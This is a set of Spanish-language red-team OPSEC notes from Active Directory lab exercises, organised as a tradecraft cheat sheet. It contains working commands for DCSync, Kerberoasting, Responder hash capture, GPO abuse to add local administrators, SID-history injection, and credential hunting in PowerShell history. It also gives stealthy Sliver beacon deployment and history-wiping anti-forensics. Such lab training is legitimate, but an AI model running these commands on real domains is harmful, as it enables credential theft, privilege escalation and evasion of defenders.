# 🥷 OPSEC Notes — Red Team Ops Roadmap

> Aprendizajes de seguridad operacional transversales a todos los labs.  
> No son notas de un lab concreto — son principios destilados de la experiencia acumulada.  
> Actualizar tras cada lab con nuevos insights.

---

## 📋 Índice

- [🥷 OPSEC Notes — Red Team Ops Roadmap](#-opsec-notes--red-team-ops-roadmap)
  - [📋 Índice](#-índice)
  - [1. 🛠️ Herramientas — Cuándo usar cada una](#1-️-herramientas--cuándo-usar-cada-una)
    - [Acceso remoto Windows](#acceso-remoto-windows)
    - [Cracking de hashes](#cracking-de-hashes)
    - [Enumeración AD](#enumeración-ad)
  - [2. 🎫 Kerberos — Decisiones tácticas](#2--kerberos--decisiones-tácticas)
    - [Árbol de decisión: qué técnica usar](#árbol-de-decisión-qué-técnica-usar)
    - [Pass-the-Ticket vs Pass-the-Hash vs Overpass-the-Hash](#pass-the-ticket-vs-pass-the-hash-vs-overpass-the-hash)
    - [Golden Ticket — Limitaciones modernas](#golden-ticket--limitaciones-modernas)
  - [3. 🔀 Pivoting — Ligolo-ng vs Chisel](#3--pivoting--ligolo-ng-vs-chisel)
  - [4. 📡 C2 — Sliver operacional](#4--c2--sliver-operacional)
    - [Dónde desplegar el beacon](#dónde-desplegar-el-beacon)
    - [Tipos de beacon](#tipos-de-beacon)
  - [5. 🏠 Living-off-the-Land — Prioridades](#5--living-off-the-land--prioridades)
  - [6. 📦 Transferencia de herramientas](#6--transferencia-de-herramientas)
    - [Limpieza post-transferencia](#limpieza-post-transferencia)
  - [7. 🖥️ Gestión del entorno de lab](#7-️-gestión-del-entorno-de-lab)
    - [Permisos AD — cuándo aplican](#permisos-ad--cuándo-aplican)
    - [Nombres localizados en Windows](#nombres-localizados-en-windows)
  - [8. 📝 Documentación operacional](#8--documentación-operacional)
    - [Convención de naming para capturas](#convención-de-naming-para-capturas)
    - [Qué documentar cuando algo falla](#qué-documentar-cuando-algo-falla)
  - [9. 🩸 BloodHound — Recolección OPSEC](#9--bloodhound--recolección-opsec)
  - [10. 🎫 Kerberos — Sesiones WinRM vs interactivas](#10--kerberos--sesiones-winrm-vs-interactivas)
  - [11. 🔑 ACL Abuse — Limpieza post-explotación](#11--acl-abuse--limpieza-post-explotación)
  - [12. 🖥️ GPO Abuse — Restaurar configuración](#12-️-gpo-abuse--restaurar-configuración)
  - [13. 🌐 Kali — Configuración de red permanente](#13--kali--configuración-de-red-permanente)
  - [14. 🔐 WriteDACL y DCSync — OPSEC](#14--writedacl-y-dcsync--opsec)
    - [Principios](#principios)
    - [Eventos generados (inevitables)](#eventos-generados-inevitables)
    - [Artefactos que persisten tras cleanup](#artefactos-que-persisten-tras-cleanup)
  - [15. 📡 ADIDNS y Responder — OPSEC](#15--adidns-y-responder--opsec)
    - [Orden de operaciones (crítico)](#orden-de-operaciones-crítico)
    - [Conflictos de puerto 80](#conflictos-de-puerto-80)
    - [DNS Global Query Block List](#dns-global-query-block-list)
    - [Responder — Modo análisis vs modo activo](#responder--modo-análisis-vs-modo-activo)
  - [16. 🔴 Sliver — OPSEC operacional avanzado](#16--sliver--opsec-operacional-avanzado)
    - [Conflicto listener HTTP tras reinicio](#conflicto-listener-http-tras-reinicio)
    - [Deploy de beacons](#deploy-de-beacons)
    - [Nomenclatura de beacons](#nomenclatura-de-beacons)
  - [17. 🗂️ Credential Hunting — OPSEC](#17-️-credential-hunting--opsec)
    - [Acceso a historial PS via SMB](#acceso-a-historial-ps-via-smb)
    - [Shares SMB — prioridad de enumeración](#shares-smb--prioridad-de-enumeración)
    - [Archivos con mayor probabilidad de credenciales](#archivos-con-mayor-probabilidad-de-credenciales)
  - [*Última actualización: Mayo 2026 — Lab-04 IRON FOREST (APT28) — Adrián Camacho*](#última-actualización-mayo-2026--lab-04-iron-forest-apt28--adrián-camacho)
  - [17. 🌲 Multi-Forest — OPSEC y Consideraciones Técnicas](#17--multi-forest--opsec-y-consideraciones-técnicas)
    - [Evil-WinRM — Limitaciones de token en entornos multi-domain](#evil-winrm--limitaciones-de-token-en-entornos-multi-domain)
    - [SID History — Restricciones de protocolo AD](#sid-history--restricciones-de-protocolo-ad)
    - [Cross-Forest Kerberoasting — TGT previo obligatorio](#cross-forest-kerberoasting--tgt-previo-obligatorio)
  - [18. 🖥️ GPO Abuse — pyGPOAbuse vs XML manual](#18-️-gpo-abuse--pygpoabuse-vs-xml-manual)
    - [Por qué XML manual falla en Windows 11](#por-qué-xml-manual-falla-en-windows-11)
    - [pyGPOAbuse — herramienta correcta](#pygpoabuse--herramienta-correcta)
    - [Cleanup completo GPO Abuse](#cleanup-completo-gpo-abuse)
  - [19. 🔧 New-SmbShare — Windows Server en español](#19--new-smbshare--windows-server-en-español)

---

## 1. 🛠️ Herramientas — Cuándo usar cada una

### Acceso remoto Windows

| Situación | Herramienta | Por qué |
|-----------|-------------|---------|
| Credenciales en claro + WinRM disponible | `evil-winrm` | Shell interactiva con upload/download integrado |
| Solo hash NTLM disponible | `evil-winrm -H <hash>` | Pass-the-Hash directo |
| SMB disponible + hash | `impacket-psexec / wmiexec` | Alternativa cuando WinRM no está abierto |
| Necesitas ejecución masiva en múltiples hosts | `crackmapexec` | Validación + ejecución en bloque |
| Sesión interactiva real (RDP) necesaria | `xfreerdp` | Necesario para algunos exploits (Potato) |

> **Nota Lab-01:** Los Potato attacks (PrintSpoofer, SweetPotato) **fallan en sesiones WinRM** porque generan Network tokens (Logon Type 3) en lugar de Interactive tokens. Requieren sesión RDP o consola física para funcionar.

---

### Cracking de hashes

| Situación | Herramienta | Modo |
|-----------|-------------|------|
| GPU disponible (físico/nativo) | `hashcat` | Máxima velocidad |
| VirtualBox / sin GPU | `john` | CPU eficiente, suficiente para labs |
| Hash AS-REP (`$krb5asrep$23$`) | `john --format=krb5asrep` o `hashcat -m 18200` | — |
| Hash TGS Kerberoasting (`$krb5tgs$23$`) | `john --format=krb5tgs` o `hashcat -m 13100` | — |
| Hash NTLM | `hashcat -m 1000` | — |
| Hash NTLMv2 (Responder) | `hashcat -m 5600` | — |

---

### Enumeración AD

| Necesidad | Herramienta | Cuándo usarla |
|-----------|-------------|---------------|
| Attack paths visuales | `BloodHound CE + SharpHound` | Siempre que haya foothold con credenciales |
| Enumeración rápida OPSEC (sin binarios) | `bloodhound-python` | Primera pasada desde Kali |
| Enumeración rápida de ACLs desde PowerShell | `PowerView` | Desde shell Evil-WinRM, LOLBin alternativo |
| Análisis offline sin agente en dominio | `Adalanche` | Cuando no puedes ejecutar SharpHound |
| Enumeración SMB/usuarios sin credenciales | `enum4linux-ng` | Recon inicial sin autenticación |

---

## 2. 🎫 Kerberos — Decisiones tácticas

### Árbol de decisión: qué técnica usar

```
¿Tienes lista de usuarios del dominio?
│
├── NO → AS-REP Roasting ciego (GetNPUsers con lista de usuarios candidatos)
│
└── SÍ → ¿Alguna cuenta tiene DoesNotRequirePreAuth?
          │
          ├── SÍ → AS-REP Roasting → hash offline → crack → credenciales
          │
          └── NO → ¿Hay cuentas con SPN?
                    │
                    ├── SÍ → Kerberoasting → TGS hash → crack → credenciales de servicio
                    │
                    └── NO → Buscar otros vectores:
                              • SMB null session → shares con credenciales
                              • LDAP anónimo → usuarios y descriptions
                              • Credential Hunting → scripts IT, PS history
```

### Pass-the-Ticket vs Pass-the-Hash vs Overpass-the-Hash

| Técnica | Cuándo preferirla | Evento generado | Requisito |
|---------|------------------|----------------|-----------|
| **Pass-the-Hash** | NTLM habilitado, acceso SMB/WinRM | 4624 Logon Type 3, NTLM en red | Hash NTLM |
| **Overpass-the-Hash** | Entornos con NTLM sospechoso | 4768 AS-REQ (Kerberos normal) | Hash NTLM → TGT |
| **Pass-the-Ticket** | Ticket ya disponible | 4768, 4769 (normal Kerberos) | TGT o TGS válido |

> **OPSEC:** Overpass-the-Hash genera tráfico Kerberos normal — indistinguible de autenticación legítima. Usar RC4 es detectable en entornos con AES obligatorio — preferir AES256 cuando sea posible.

### Golden Ticket — Limitaciones modernas

> **Aprendizaje Lab-01:** El Golden Ticket clásico falla en Windows Server 2022 con PAC Validation. Usar Diamond Ticket (Rubeus) o AES256 del krbtgt como alternativas.

---

## 3. 🔀 Pivoting — Ligolo-ng vs Chisel

| Aspecto | Ligolo-ng | Chisel |
|---------|-----------|--------|
| **Capa de operación** | Kernel (tuntap interface) | Userspace (SOCKS5 proxy) |
| **Compatibilidad de herramientas** | 100% — cualquier herramienta funciona directo | Requiere `proxychains` |
| **Nmap a través del túnel** | ✅ Directo | ⚠️ Limitado (SYN scan no funciona) |
| **Velocidad** | Alta | Media |

**Usar Ligolo-ng** para operaciones largas con múltiples herramientas. **Usar Chisel** para port forward puntual.

---

## 4. 📡 C2 — Sliver operacional

### Dónde desplegar el beacon

| Regla | Razón |
|-------|-------|
| **Preferir workstations sobre servidores** | Menos monitorización, tráfico web esperado |
| **Si hay múltiples hosts, beacon en el menos crítico** | Minimiza impacto de detección |
| **En DC solo si es necesario para el objetivo** | El DC es el activo más monitoreado |

### Tipos de beacon

| Tipo | Protocolo | Cuándo |
|------|-----------|--------|
| `beacon --http` | HTTP/S | Default — se mimetiza con tráfico web |
| `beacon --mtls` | mTLS | Cuando el entorno inspecciona HTTPS |
| `beacon --dns` | DNS | Solo salida DNS disponible |

> **Diferencia beacon vs session:** Beacon = asíncrono (check-in cada N segundos). Session = conexión persistente bidireccional. Para operaciones largas, usar beacons.

---

## 5. 🏠 Living-off-the-Land — Prioridades

LOLBins primero — generan menos alertas porque son procesos firmados por Microsoft.

```powershell
whoami /all
ipconfig /all && route print
net user /domain && net group "Domain Admins" /domain
setspn -T <dominio> -Q */*
nltest /domain_trusts
```

---

## 6. 📦 Transferencia de herramientas

| Situación | Método | Comando |
|-----------|--------|---------|
| WinRM disponible | Evil-WinRM upload | `upload "/ruta/local/herramienta.exe" "C:\destino\herramienta.exe"` |
| Solo SMB | SMB share temporal desde Kali | `impacket-smbserver share /tmp/tools -smb2support` |
| HTTP disponible | Python HTTP server | `python3 -m http.server 8888` |

> **Nota upload Evil-WinRM:** Siempre usar comillas en la ruta. Sin comillas en zsh puede interpretar `!` como expansión de historial.

### Limpieza post-transferencia

```powershell
Remove-Item C:\Windows\Temp\tool.exe -Force
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force
```

---

## 7. 🖥️ Gestión del entorno de lab

### Permisos AD — cuándo aplican

> Los permisos AD asignados a un usuario no se aplican en la sesión actual si ya tenía un token cacheado. Aplican en el siguiente logon.

### Nombres localizados en Windows

| Grupo (EN) | Grupo (ES) | SID universal |
|-----------|-----------|---------------|
| Domain Admins | Admins. del dominio | S-1-5-21-...-512 |
| Remote Management Users | Usuarios de administración remota | S-1-5-32-580 |

> **Regla:** En scripts PowerShell, buscar grupos por SID, nunca por nombre.

---

## 8. 📝 Documentación operacional

### Convención de naming para capturas

```
screenshots/FASE-XX-Nombre-Tecnica/faseXX-YY-descripcion-accion.png

Ejemplo:
FASE-04-WriteDACL-Abuse/fase04-01-dacledit-write-dcsync.png
```

### Qué documentar cuando algo falla

1. **Qué se intentó** — comando exacto
2. **Qué error se obtuvo** — output completo
3. **Análisis de causa** — por qué falló técnicamente
4. **Decisión táctica** — qué vector alternativo se tomó

---

## 9. 🩸 BloodHound — Recolección OPSEC

**Regla:** Usar bloodhound-python como primera pasada (OPSEC). Solo subir SharpHound cuando se necesita coverage completo de ACLs/GPOs.

| Criterio | bloodhound-python | SharpHound |
|----------|-------------------|------------|
| Binarios en objetivo | ❌ Ninguno | ✅ SharpHound.exe |
| Detección | Solo tráfico LDAP voluminoso | Proceso + eventos + AV |
| Coverage ACLs/GPO | ⚠️ Parcial | ✅ Completo |
| Compatible con BloodHound CE 5.x | ❌ No (importación) | ✅ Sí |

> **Nota crítica Lab-04:** Los ZIPs de bloodhound-python NO importan correctamente en BloodHound CE 5.x — los nodos se crean pero las queries Cypher no devuelven resultados. Usar SharpHound v2.5.9 para importar en CE.

---

## 10. 🎫 Kerberos — Sesiones WinRM vs interactivas

**Problema:** Rubeus `ptt`, Potato attacks y manipulación de tokens Kerberos **falla en sesiones WinRM** (Network Logon Type 3).

**Solución:** Usar impacket desde Kali:

```bash
export KRB5CCNAME=/tmp/ticket.ccache
impacket-secretsdump -k -no-pass DC-01.dominio.local
```

---

## 11. 🔑 ACL Abuse — Limpieza post-explotación

**Obligatorio:** Eliminar SPNs añadidos para Targeted Kerberoasting.

```bash
bloodyAD -u usuario -p password -d dominio --host IP \
  set object cuenta servicePrincipalName -v ""
```

---

## 12. 🖥️ GPO Abuse — Restaurar configuración

```powershell
$gpoId = (Get-GPO -Name "GPO-NOMBRE").Id.ToString()
Remove-Item "\\DC\SYSVOL\dominio\Policies\{$gpoId}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
```

---

## 13. 🌐 Kali — Configuración de red permanente

```bash
sudo nmcli con modify "LabRedTeam" ipv4.never-default yes
sudo nmcli con modify "LabRedTeam" +ipv4.routes "10.0.3.0/24 10.0.2.1"
sudo nmcli con modify "Wired connection 1" ipv4.route-metric 50
```

---

## 14. 🔐 WriteDACL y DCSync — OPSEC

### Principios

- **Backup automático:** `dacledit` genera `.bak` — guardarlo y usarlo para restaurar exactamente
- **Limpiar inmediatamente** después de DCSync — no dejar rights más tiempo del necesario
- **Verificar antes de limpiar:** `dacledit -action read | grep principal`
- **Orden correcto:** Añadir rights → DCSync → Eliminar rights — en un mismo flujo, no entre sesiones

### Eventos generados (inevitables)

- `5136` — Modificación nTSecurityDescriptor (siempre se genera, el más detectable)
- `4662` — Acceso objeto dominio con replication rights
- Ambos persisten en logs aunque se eliminen los rights después

### Artefactos que persisten tras cleanup

| Artefacto | Persistencia |
|---|---|
| Event ID 5136, 4662, 4688 | Hasta rotación de logs del DC |
| Archivo `.bak` de dacledit | Indefinida (en Kali) |
| Historial PS del Administrador | Hasta limpieza manual |

---

## 15. 📡 ADIDNS y Responder — OPSEC

### Orden de operaciones (crítico)

```
1. Parar Docker/BloodHound CE → sudo docker compose stop
2. Verificar puerto libre → sudo fuser 80/tcp
3. Arrancar Responder → sudo responder -I eth0 -wF --lm
4. Capturar hash NTLMv2
5. Parar Responder → sudo pkill responder + sudo fuser -k 80/tcp
6. Arrancar Sliver listener → http (en consola Sliver)
7. Deploy beacon
```

### Conflictos de puerto 80

BloodHound CE (Docker), Responder y Sliver HTTP compiten por el puerto 80. Solo uno puede estar activo a la vez.

```bash
# Verificar qué proceso ocupa el puerto
sudo fuser 80/tcp
sudo ss -tlnp | grep ':80'

# Liberar
sudo fuser -k 80/tcp
```

### DNS Global Query Block List

- Desactivar genera `Event 5136` en el DC — detectable
- **Restaurar tras la operación:**
  ```powershell
  Set-DnsServerGlobalQueryBlockList -Enable $true
  dnscmd /clearcache
  ```

### Responder — Modo análisis vs modo activo

- `-A` (analyze): solo escucha, NO captura hashes
- `-wF` (WPAD + Force auth): activo, captura hashes
- `Invoke-WebRequest -UseDefaultCredentials` desde WinRM **NO propaga credenciales** — usar `System.Net.WebClient`:
  ```powershell
  $cred = New-Object System.Net.NetworkCredential("usuario", "password", "DOMINIO")
  $wc = New-Object System.Net.WebClient
  $wc.Credentials = $cred
  $wc.DownloadString("http://wpad.dominio.local/wpad.dat")
  ```

---

## 16. 🔴 Sliver — OPSEC operacional avanzado

### Conflicto listener HTTP tras reinicio

Matar el proceso externo en puerto 80 no libera el job en Sliver. Si el listener aparece como `AlreadyExists`:

```bash
sudo systemctl restart sliver
sleep 5
sliver-client
# Luego: http
```

### Deploy de beacons

```powershell
# Subir beacon (comillas obligatorias en zsh)
upload "/tmp/iron_forest_dc01.exe" "C:\Windows\Temp\iron_forest_dc01.exe"

# Ejecutar silenciosamente
Start-Process "C:\Windows\Temp\iron_forest_dc01.exe" -WindowStyle Hidden

# Verificar
Get-Process | Where-Object { $_.Name -like "*beacon*" }

# Limpiar
Stop-Process -Name "beacon" -Force
Remove-Item "C:\Windows\Temp\beacon.exe" -Force
```

### Nomenclatura de beacons

Usar nombres de operación: `IRON_FOREST_DC01`, `GHOST_FOREST_WKSTN` — facilita identificación a lo largo de múltiples labs.

---

## 17. 🗂️ Credential Hunting — OPSEC

### Acceso a historial PS via SMB

```bash
# Sintaxis correcta con ruta de destino local (obligatorio)
smbclient \\\\DC-01\\C$ -U 'usuario:password' \
  -c 'get "Users\Administrador\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" /tmp/ps_history.txt'
```

> Sin ruta destino, smbclient crea una ruta anidada que falla silenciosamente.

### Shares SMB — prioridad de enumeración

1. `C$` con credencial de servicio (historial PS, archivos sistema)
2. Shares custom (`IT-Scripts`, `Finance`) con cuenta de usuario
3. `SYSVOL` para GPP passwords (siempre accesible con cualquier cuenta)

### Archivos con mayor probabilidad de credenciales

```powershell
# Extensiones prioritarias
Get-ChildItem C:\ -Recurse -Include "*.ps1","*.bat","*.config","*.xml","*.env" -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|passwd|pwd|secret" -ErrorAction SilentlyContinue

# Historial PS de todos los usuarios
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" |
  Get-Content | Select-String "password|-p |/pass"
```

---

*Última actualización: Mayo 2026 — Lab-04 IRON FOREST (APT28) — Adrián Camacho*
---

## 17. 🌲 Multi-Forest — OPSEC y Consideraciones Técnicas

### Evil-WinRM — Limitaciones de token en entornos multi-domain

Evil-WinRM usa Network Logon (Type 3). Este tipo de logon limita las operaciones que pueden hacer las herramientas AD contra otros dominios desde la sesión:

- `Get-ADGroup -Server otro.dominio.local` falla con `ADServerDownException` aunque el DC sea accesible
- El token de red no puede autenticarse contra ADWS (puerto 9389) de otro dominio
- **Workaround:** Usar `.NET System.Security.Principal.NTAccount` para resolver SIDs via LDAP:
  ```powershell
  ([System.Security.Principal.NTAccount]"ATACKCORP\Admins. del dominio").Translate(
      [System.Security.Principal.SecurityIdentifier]).Value
  ```

### SID History — Restricciones de protocolo AD

El atributo `sIDHistory` está protegido contra modificación via LDAP incluso siendo DA:
- `bloodyAD` no puede modificarlo (limitación de protocolo, no de herramienta)
- `dacledit` no puede modificarlo
- Solo modificable via acceso directo al ntds.dit (DSInternals) o via DS-Replication

Siempre usar **DSInternals `Add-ADDBSidHistory`** — requiere parar NTDS (~30s de interrupción):
```powershell
Stop-Service NTDS -Force
Import-Module DSInternals.psd1
Add-ADDBSidHistory -SamAccountName user -SidHistory 'SID' -DBPath 'C:\Windows\NTDS\ntds.dit' -Force
Start-Service NTDS
```

### Cross-Forest Kerberoasting — TGT previo obligatorio

```bash
impacket-getTGT dominio/user:pass -dc-ip IP
export KRB5CCNAME=user.ccache
impacket-GetUserSPNs dominio/user:pass -target-domain corp.local -dc-ip DC-02-IP -request
```

Sin TGT exportado, impacket no puede generar el inter-realm referral ticket.

---

## 18. 🖥️ GPO Abuse — pyGPOAbuse vs XML manual

### Por qué XML manual falla en Windows 11

`ImmediateTaskV2` y `Groups.xml` GPP no son procesados por Windows 11 moderno. La extensión cliente GPP puede estar deshabilitada. Además, si `GPT.INI Version=0` el cliente no reprocesa el GPO aunque el contenido haya cambiado.

### pyGPOAbuse — herramienta correcta

pyGPOAbuse incrementa automáticamente el GPT.INI Version counter y usa un mecanismo diferente al GPP que sí funciona en Windows 11:

```bash
python3 /opt/redteam/pyGPOAbuse/pygpoabuse.py 'dom/user:pass' \
    -gpo-id 'GUID-DEL-GPO' \
    -command 'net localgroup Administradores DOMAIN\user /add' \
    -dc-ip IP \
    -f
```

### Cleanup completo GPO Abuse

```bash
# 1. Eliminar ScheduledTask
python3 pygpoabuse.py 'dom/user:pass' -gpo-id GUID -dc-ip IP -taskname TASK_xxxxxxxx --cleanup

# 2. Verificar directorio vacío
smbclient //IP/SYSVOL -U 'dom\user%pass' -c "ls dom/Policies/{GUID}/Machine/Preferences/ScheduledTasks/"

# 3. Restaurar DACL desde backup
impacket-dacledit -action restore -target-dn 'CN={GUID},CN=Policies,...' \
    -file loot/dacledit-backup.bak dom/user:pass -dc-ip IP
```

---

## 19. 🔧 New-SmbShare — Windows Server en español

`-ReadAccess "Everyone"` y `-FullAccess "ATACKCORP\Admins. del dominio"` fallan en Windows Server en español:

```powershell
# Usar SID directos en lugar de nombres de grupo
New-SmbShare -Name "ShareName" -Path "C:\Path" -ReadAccess "*S-1-1-0"              # Everyone
New-SmbShare -Name "ShareName" -Path "C:\Path" -FullAccess "*S-1-5-21-XXX-XXX-XXX-512"  # Domain Admins SID
```

En entornos multi-forest con trust degradado, el nombre de grupo también puede fallar. Siempre usar SID.

---

*Última actualización: Junio 2026 — Lab-06 BLACK POLICY (APT28)*